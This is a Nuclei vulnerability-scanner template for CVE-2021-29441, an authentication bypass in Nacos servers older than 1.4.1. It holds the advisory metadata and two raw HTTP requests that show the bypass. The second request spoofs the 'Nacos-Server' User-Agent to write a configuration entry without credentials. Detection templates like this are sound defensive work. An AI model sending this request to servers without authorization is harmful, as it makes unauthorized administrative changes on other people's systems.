id: CVE-2021-29441
info:
  name: Nacos <1.4.1 - Authentication Bypass
  author: dwisiswant0
  severity: critical
  description: The Nacos authentication bypass vulnerability allows unauthorized users
    to execute admin tasks by spoofing the user-agent HTTP header on versions prior
    to 1.4.1, and templates using Nuclei engine must be on version between 2.3.3 and
    2.3.5.
  reference:
  - https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/
  - https://github.com/alibaba/nacos/issues/4701
  - https://github.com/advisories/GHSA-36hp-jr8h-556f
  - https://github.com/alibaba/nacos/pull/4703
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-29441
    cwe-id: CWE-290
  tags: nacos,auth-bypass,cve,cve2021
  metadata:
    impact: The CVE-2021-29441 vulnerability in Nacos <1.4.1 allowing authentication
      bypass may result in unauthorized access to administrative tasks on the server.
    recommendation: It is strongly recommended that users upgrade their Nacos engine
      to version 1.4.1 or higher to prevent potential authentication bypass vulnerabilities.
requests:
- raw:
  - 'POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  - 'POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    User-Agent: Nacos-Server

    '
  req-condition: true
  matchers-condition: and
  matchers:
  - type: dsl
    dsl:
    - status_code_1 == 403
    - status_code_2 == 200
    condition: and
  - type: dsl
    dsl:
    - contains(body_1, 'Forbidden')
    - body_2 == 'true'
    condition: and
  - type: word
    words:
    - application/json
    part: header
